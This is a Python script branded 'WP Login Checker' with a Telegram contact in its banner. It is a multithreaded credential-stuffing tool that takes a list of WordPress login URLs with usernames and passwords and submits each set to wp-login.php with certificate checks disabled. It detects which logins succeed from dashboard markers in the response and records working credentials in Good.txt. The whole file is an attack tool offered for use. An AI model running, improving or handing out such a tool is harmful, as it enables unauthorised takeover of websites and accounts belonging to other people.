import requests
import json
import os
from multiprocessing.dummy import Pool
from colorama import Fore, init
from bs4 import BeautifulSoup as soup
from urllib.parse import urlparse  # Mengimpor urlparse dari urllib.parse

requests.packages.urllib3.disable_warnings()
init()

red = Fore.RED
green = Fore.GREEN
reset = Fore.RESET
yellow = Fore.YELLOW
bluer = Fore.BLUE

banner = f"""
{red}
  _          _______
 \ \        / /  __ \
  \ \  /\  / /| |__) |
   \ \/  \/ / |  ___/
    \  /\  /  | |
     \/  \/   |_|     {reset} {green}Login Checker {yellow}V 3.6.9

{reset}
{red}[ INFO ]{reset} - > {yellow}TEXT-Format{reset} :{reset} {green} http://site.com/wp-login.php:admin:admin {reset}\n
{bluer}[ Leviathan Perfect Hunter ]{reset} - >{red} https://t.me/alivosreal {reset}
"""

def login(target):
    try:
        # Memisahkan target menjadi URL, username, dan password
        parts = target.split(':')
        if len(parts) < 3:
            print(f'[{yellow}#{reset}] {target} => [ {red}Invalid format! Skipping...{reset} ]')
            return

        url = ':'.join(parts[:-2])  # Menggabungkan kembali bagian URL yang terpisah oleh titik dua
        user = parts[-2]
        pwd = parts[-1]

        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36 RuxitSynthetic/1.0 v3652647187556729212 t6142409407075435073 ath259cea6f altpriv cvcv=2 smf=0'
        }

        cook = requests.Session()
        cooki = cook.get(url, allow_redirects=False)
        cookies = dict(cooki.cookies)
        url_dash = url.replace('/wp-login.php', '')
        payload = {'log': f'{user}', 'pwd': f'{pwd}', 'wp-submit': 'Log+In', 'redirect_to': f'{url_dash}/wp-admin/',
                   'testcookie': '1'}
        req = requests.post(url, data=payload, headers=headers, allow_redirects=True, cookies=cookies,
                            verify=False).content.decode('utf8')
        if 'dashboard' in req or 'Howdy, ' in req or '/wp-admin/admin-ajax.php' in req:
            print(f'[{yellow}#{reset}] {target} => [ {green}Success Login{reset} ]')
            open('Good.txt', 'a+', encoding="utf8").write(target + '\n')
        else:
            print(f'[{yellow}#{reset}] {target} => [ {red}Error !{reset} ]')
            open('BAD.txt', 'a+', encoding="utf8").write(target + '\n')

    except requests.exceptions.Timeout:
        print(f"[{yellow}#{reset}] {target} => [ {red}Timeout{reset} ]")
    except Exception as e:
        print(f"[{yellow}#{reset}] {target} => [ {red}Error: {e}{reset} ]")

def main():
    try:
        if os.name == "nt":
            os.system('cls')
        elif os.name == "posix":
            os.system('clear')
        else:
            pass
        print(banner)
        file = list(dict.fromkeys(open(input("[ List ] : ")).read().splitlines()))
        thread = int(input("[ Thread ] : "))
        pool = Pool(thread)
        pool.map(login, file)
        pool.close()
        pool.join()

    except Exception as e:
        print(f"[{yellow}#{reset}] Error: {e}")
        exit()

if __name__ == "__main__":
    main()
